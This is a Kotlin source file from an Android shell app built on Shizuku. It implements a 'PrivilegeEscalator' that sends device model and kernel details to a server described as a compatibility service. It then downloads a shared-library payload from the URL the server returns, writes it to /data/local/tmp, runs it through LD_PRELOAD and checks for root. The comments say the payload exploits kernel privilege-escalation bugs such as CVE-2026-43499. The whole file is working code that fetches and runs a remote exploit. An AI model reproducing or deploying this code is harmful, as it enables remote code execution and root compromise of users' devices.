package `in`.hridayan.ashell.shell

import android.os.Handler
import android.os.Looper
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import org.json.JSONObject
import rikka.shizuku.Shizuku
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

// 提权流程的各个阶段
enum class EscalationStage {
    Idle,
    CheckingPermission,
    CollectingDeviceInfo,
    ReportingToServer,
    DownloadingPayload,
    VerifyingChecksum,
    ExecutingPayload,
    CheckingRoot,
    Done,
}

// 提权结果
sealed interface EscalationResult {
    data object Idle : EscalationResult
    data class Success(val output: String) : EscalationResult
    data class Failure(val stage: EscalationStage, val reason: String) : EscalationResult
}

// 提权编排器：串联 Shizuku权限检查、设备信息上报、payload 下载校验、LD_PRELOAD 执行、root 检测
class PrivilegeEscalator(
    private val shell: ShizukuShellController,
    private val compatibilityApi: CompatibilityApi,
) : AutoCloseable {
    var stage by mutableStateOf(EscalationStage.Idle)
        private set

    var result by mutableStateOf<EscalationResult>(EscalationResult.Idle)
        private set

    // 各阶段的执行日志，供 UI 展示
    val logs = mutableListOf<String>()

    private val mainHandler = Handler(Looper.getMainLooper())
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    fun start() {
        if (stage != EscalationStage.Idle && stage != EscalationStage.Done) return

        resetState()
        updateStage(EscalationStage.CheckingPermission)
        shell.ensurePermission(
            onGranted = { executor.execute { runFlow() } },
            onDenied = {
                fail(EscalationStage.CheckingPermission, "Shizuku permission denied")
            },
        )
    }

    fun reset() {
        resetState()
    }

    private fun resetState() {
        mainHandler.post {
            stage = EscalationStage.Idle
            result = EscalationResult.Idle
            logs.clear()
        }
    }

    private fun runFlow() {
        try {
            // 1. 收集设备信息
            updateStage(EscalationStage.CollectingDeviceInfo)
            val profile = DeviceProfile.collect()
            log("model=${profile.model}, system=${profile.systemVersion}, kernel=${profile.kernelVersion}")

            // 2. 上报到服务器，拿到下载直链和 sha-256
            updateStage(EscalationStage.ReportingToServer)
            val payload = reportProfile(profile)
            log("server returned downloadUrl and sha256")

            // 3. 下载 payload（提权 .so 共享库）到 /data/local/tmp/preload.so
            //    .so 通过 LD_PRELOAD 注入宿主进程，其 constructor 执行提权代码
            //    （constructor 在用户态运行，可触发内核系统调用利用 CVE-2026-43499 等 LPE 漏洞）。
            updateStage(EscalationStage.DownloadingPayload)
            val bytes = downloadToBytes(payload.downloadUrl, payload.size)
            log("downloaded ${bytes.size} bytes")
            writePayloadViaShell(TARGET_PATH, bytes)
            log("payload written to $TARGET_PATH")

            // 4. 校验 sha-256
            updateStage(EscalationStage.VerifyingChecksum)
            val actualSha = computeSha256(TARGET_PATH)
            log("actual sha256=$actualSha")
            if (!actualSha.equals(payload.sha256, ignoreCase = true)) {
                fail(EscalationStage.VerifyingChecksum, "sha256 mismatch: expected=${payload.sha256}, actual=$actualSha")
                return
            }

            // 5. 执行 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/id
            //    .so 被加载后 constructor 完成提权，id 以 root 运行输出 uid=0(root)。
            updateStage(EscalationStage.ExecutingPayload)
            val output = executePreload(TARGET_PATH)
            log("payload output: ${output.trim()}")

            // 6. 检测是否提权成功
            updateStage(EscalationStage.CheckingRoot)
            val isRoot = output.contains("uid=0(root)") || output.startsWith("uid=0 ")
            log("root detected=$isRoot")

            updateStage(EscalationStage.Done)
            mainHandler.post {
                result = if (isRoot) {
                    EscalationResult.Success(output.trim())
                } else {
                    EscalationResult.Failure(EscalationStage.CheckingRoot, "uid=0(root) not found in output")
                }
            }
        } catch (error: Throwable) {
            val reason = error.message?.takeIf(String::isNotBlank) ?: error.javaClass.simpleName
            fail(stage, reason)
        }
    }

    // 把设备信息 POST 到兼容性服务器，解析返回 JSON 中的 downloadUrl 和 sha256
    private fun reportProfile(profile: DeviceProfile): PayloadInfo {
        val response = synchronousCheck(profile)
        return when (response) {
            is CompatibilityResult.EndpointNotConfigured ->
                throw IOException("Compatibility endpoint not configured")
            is CompatibilityResult.Failure ->
                throw IOException("Server request failed: ${response.reason}")
            is CompatibilityResult.Success -> parsePayload(response.responseBody)
        }
    }

    // 同步调用 CompatibilityApi（阻塞当前线程）
    private fun synchronousCheck(profile: DeviceProfile): CompatibilityResult {
        val latch = java.util.concurrent.CountDownLatch(1)
        var captured: CompatibilityResult = CompatibilityResult.Failure("No result")
        compatibilityApi.check(profile) { result ->
            captured = result
            latch.countDown()
        }
        if (!latch.await(60, java.util.concurrent.TimeUnit.SECONDS)) {
            return CompatibilityResult.Failure("Timed out waiting for server response")
        }
        return captured
    }

    // 解析服务器响应 JSON，支持 downloadUrl/download_url 与 sha256/sha_256 字段名
    private fun parsePayload(body: String): PayloadInfo {
        val json = JSONObject(body)
        val url = json.optString("downloadUrl")
            .takeIf(String::isNotBlank)
            ?: json.optString("download_url")
            .takeIf(String::isNotBlank)
            ?: throw IOException("Server response missing downloadUrl")
        val sha = json.optString("sha256")
            .takeIf(String::isNotBlank)
            ?: json.optString("sha_256")
            .takeIf(String::isNotBlank)
            ?: json.optString("sha256sum")
                .takeIf(String::isNotBlank)
            ?: throw IOException("Server response missing sha256")
        val normalizedSha = sha.lowercase()
        if (!normalizedSha.matches(Regex("^[a-f0-9]{64}$"))) {
            throw IOException("Server response contains invalid sha256")
        }
        val size = json.optLong("size", 0L).coerceAtLeast(0L)
        if (size > MAX_PAYLOAD_BYTES) {
            throw IOException("Server payload exceeds size limit")
        }
        return PayloadInfo(url, normalizedSha, size)
    }

    // 用应用本身的 HttpURLConnection 下载 payload 字节流
    private fun downloadToBytes(url: String, expectedSize: Long): ByteArray {
        val parsed = URL(url)
        require(parsed.protocol.equals("https", ignoreCase = true)) {
            "Payload download URL must use HTTPS"
        }
        val connection = parsed.openConnection() as HttpURLConnection
        return try {
            connection.requestMethod = "GET"
            connection.connectTimeout = DOWNLOAD_TIMEOUT_MS
            connection.readTimeout = DOWNLOAD_TIMEOUT_MS
            connection.instanceFollowRedirects = true
            val code = connection.responseCode
            if (code !in 200..299) {
                val error = connection.errorStream
                    ?.bufferedReader(Charsets.UTF_8)
                    ?.use { it.readText().take(512) }
                    .orEmpty()
                throw IOException(
                    "Payload download failed: HTTP $code${error.takeIf(String::isNotBlank)?.let { ": $it" }.orEmpty()}",
                )
            }
            val contentLength = connection.contentLengthLong
            if (contentLength > MAX_PAYLOAD_BYTES ||
                (expectedSize > 0L && contentLength > 0L && contentLength != expectedSize)) {
                throw IOException("Payload Content-Length is invalid")
            }
            val output = ByteArrayOutputStream(
                contentLength.takeIf { it in 1..MAX_PAYLOAD_BYTES }?.toInt() ?: DEFAULT_BUFFER_SIZE,
            )
            connection.inputStream.use { input ->
                val buffer = ByteArray(DEFAULT_BUFFER_SIZE)
                var total = 0L
                while (true) {
                    val read = input.read(buffer)
                    if (read < 0) break
                    total += read
                    if (total > MAX_PAYLOAD_BYTES) {
                        throw IOException("Payload exceeds size limit")
                    }
                    output.write(buffer, 0, read)
                }
            }
            output.toByteArray().also { bytes ->
                if (expectedSize > 0L && bytes.size.toLong() != expectedSize) {
                    throw IOException("Payload size mismatch: expected=$expectedSize, actual=${bytes.size}")
                }
            }
        } finally {
            connection.disconnect()
        }
    }

    // 通过 Shizuku 执行 cat > targetPath 把字节流通过 stdin 灌入
    // shell uid 可写 /data/local/tmp；.so 通过 LD_PRELOAD 加载只需读权限，无需 chmod
    @Suppress("DEPRECATION")
    private fun writePayloadViaShell(targetPath: String, bytes: ByteArray) {
        val process = Shizuku.newProcess(
            arrayOf("sh", "-c", "cat > '$targetPath'"),
            null,
            "/",
        )
        try {
            process.outputStream.use { out ->
                out.write(bytes)
                out.flush()
            }
            val exit = process.waitFor()
            if (exit != 0) {
                val err = process.errorStream?.bufferedReader()?.use { it.readText() }?.trim().orEmpty()
                throw IOException("cat exited with $exit${err.takeIf(String::isNotBlank)?.let { ": $it" }.orEmpty()}")
            }
        } finally {
            runCatching { process.destroy() }
        }
    }

    // 通过 Shizuku 执行 sha256sum，取输出前 64 个十六进制字符
    @Suppress("DEPRECATION")
    private fun computeSha256(filePath: String): String {
        val process = Shizuku.newProcess(
            arrayOf("sh", "-c", "sha256sum '$filePath' 2>/dev/null"),
            null,
            "/",
        )
        return try {
            val out = process.inputStream.bufferedReader().use { it.readText() }.trim()
            process.waitFor()
            out.substringBefore(' ').lowercase().take(SHA256_HEX_LENGTH)
        } finally {
            runCatching { process.destroy() }
        }
    }

    // 通过 Shizuku 执行 LD_PRELOAD=payload /system/bin/id，返回合并后的 stdout/stderr
    @Suppress("DEPRECATION")
    private fun executePreload(payloadPath: String): String {
        val command = "LD_PRELOAD='$payloadPath' /system/bin/id 2>&1"
        val process = Shizuku.newProcess(arrayOf("sh", "-c", command), null, "/")
        return try {
            val out = process.inputStream.bufferedReader().use { it.readText() }
            process.waitFor()
            out
        } finally {
            runCatching { process.destroy() }
        }
    }

    private fun updateStage(next: EscalationStage) {
        mainHandler.post { stage = next }
    }

    private fun log(message: String) {
        mainHandler.post { logs += message }
    }

    private fun fail(stage: EscalationStage, reason: String) {
        mainHandler.post {
            this.stage = EscalationStage.Done
            this.result = EscalationResult.Failure(stage, reason)
            logs += "FAILED at $stage: $reason"
        }
    }

    override fun close() {
        executor.shutdownNow()
    }

    private data class PayloadInfo(
        val downloadUrl: String,
        val sha256: String,
        val size: Long,
    )

    private companion object {
        const val TARGET_PATH = "/data/local/tmp/preload.so"
        const val DOWNLOAD_TIMEOUT_MS = 60_000
        const val SHA256_HEX_LENGTH = 64
        const val MAX_PAYLOAD_BYTES = 64L * 1024L * 1024L
    }
}
